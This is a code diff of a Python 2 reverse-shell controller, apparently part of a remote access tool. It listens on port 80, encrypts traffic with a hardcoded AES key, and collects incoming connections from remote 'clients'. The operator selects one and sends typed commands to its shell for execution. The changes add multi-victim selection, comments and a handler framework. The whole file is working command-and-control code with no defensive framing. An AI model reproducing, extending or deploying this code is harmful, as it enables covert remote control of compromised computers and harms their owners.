@@ -6,31 +6,80 @@ aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
 EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
 DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))
 
-marker = chr(255)
+marker = chr(255) # End of message marker
 TIMEOUT = 30
 
 server_sock = socket.socket()
 server_sock.bind(("0.0.0.0",80))
 server_sock.listen(5)
 
+print "Listening for client."
 
-comm_socket, addr = server_sock.accept()
-sys.stdout.write(comm_socket.recv(4096)[:-1])
+def print_clients(clients):
+	try:
+		os.system('cls' if os.name == 'nt' else 'clear')
+		print("Listening for clients...")
+		print("*-----*")
+		if not clients:
+			print(" ")
+		else:
+			for i, sock in enumerate(clients):
+				print("["+str(i+1)+"]: "+str(clients[i][0])+":"+str(clients[i][1]))
+		print("*-----*")
+		print("Press Ctrl-C to select client.")
+	except KeyboardInterrupt:
+		return
+		
+def get_client():
+	server_sock.settimeout(1)
+	clientsocks = []
+	clientaddrs = []
+	while True:
+		print_clients(clientaddrs)
+		try:
+			try:
+				s, a = server_sock.accept()
+				clientsocks.append(s)
+				clientaddrs.append(a)
+			except socket.timeout:
+				continue
+		except KeyboardInterrupt:
+			os.system('cls' if os.name == 'nt' else 'clear')
+			print("*-----*")
+			for i, sock in enumerate(clientaddrs):
+				print("["+str(i+1)+"]: "+str(clientaddrs[i][0])+":"+str(clientaddrs[i][1]))
+			print(" \n[0]: Exit")
+			print("*-----*")
+			selected = raw_input("[?]Input number of selected sock: ")
+			if selected == "0":
+				os._exit(0)
+			s = clientsocks[int(selected)-1]
+			a = clientaddrs[int(selected)-1][0]
+			clientsocks = []
+			clientaddrs = []
+			return s, a
+
+comm_socket, addr = get_client()
+comm_socket.setblocking(1)
+sys.stdout.write(comm_socket.recv(4096)[:-1]) # Receive current directory and prompt
 
 output_queue = Queue.Queue()
 
-class MessageHandler:
+class MessageHandler: # Base class for adding a message handler
 	def __init__(self, data_prefix):
-		self.data_prefix = data_prefix
-		self.input_queue = Queue.Queue()
+		self.data_prefix = data_prefix # Prefix used to identify to which handler data should be sent
+		self.input_queue = Queue.Queue() # Queue of data to process
 		
 	def send(self, data):
-		output_queue.put(self.data_prefix+data+marker)
+		output_queue.put(self.data_prefix+data+marker) # Place message on queue to be sent 
+		
+	def put(self, data):
+		self.input_queue.put(data)
 		
 	def run(self):
 		pass
 		
-class UserInputHandler(MessageHandler):
+class UserInputHandler(MessageHandler): # Handler which takes user input and sends it for execution
 
 	def run(self):
 		try:
@@ -38,31 +87,33 @@ class UserInputHandler(MessageHandler):
 				user_input = raw_input()
 				self.send(user_input)
 				sys.stdout.write(self.input_queue.get())
-		except EOFError:
+		except EOFError: # Exit when user presses Control-C
 			os._exit(0)
+			
+class TransmitHandler(MessageHandler): # Pseudo-handler to send data to shell
+	def run(self):
+		while True:
+			comm_socket.sendall(output_queue.get())	
 			
 handlers = []
 user_input_handler = UserInputHandler(chr(1))
+transmit_handler = TransmitHandler(chr(0)) # Create handlers
 handlers.append(user_input_handler)
+handlers.append(transmit_handler)
 
-t = threading.Thread(target=user_input_handler.run)
-t.daemon = True
-t.start()
-
-def data_sender():
-	while True:
-		comm_socket.sendall(output_queue.get())
-				
-t = threading.Thread(target=data_sender)
-t.daemon = True
-t.start()
+for handler in handlers: # Start handlers
+	t = threading.Thread(target=handler.run)
+	t.daemon = True
+	t.start()
 
 while True:
-	data = comm_socket.recv(4096)[:-1]
+	data = ""
+	while not data.endswith(marker):
+		data += comm_socket.recv(4096)
 	if not data: break
+	data = data[:-1] # Get data from shell and remove marker
 	
-	if data.startswith(chr(1)):
-		user_input_handler.input_queue.put(data[1:])
-		
-	elif data.startswith(chr(9)):
-		pass
+	for handler in handlers:
+		if handler.data_prefix == data[0]: # Put data on correct handler's queue
+			handler.put(data[1:])
+			break
